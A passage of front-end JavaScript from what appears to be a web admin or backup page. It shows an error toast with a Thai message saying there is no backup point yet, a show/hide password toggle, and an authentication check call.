showToast(res.data.message || 'ยังไม่มีจุดสำรองข้อมูล', 'error');
}
});
$('toggle-pw').addEventListener('click', () => {
const input = $('password');
input.type = input.type === 'password' ? 'text' : 'password';
});
checkAuth();
})();
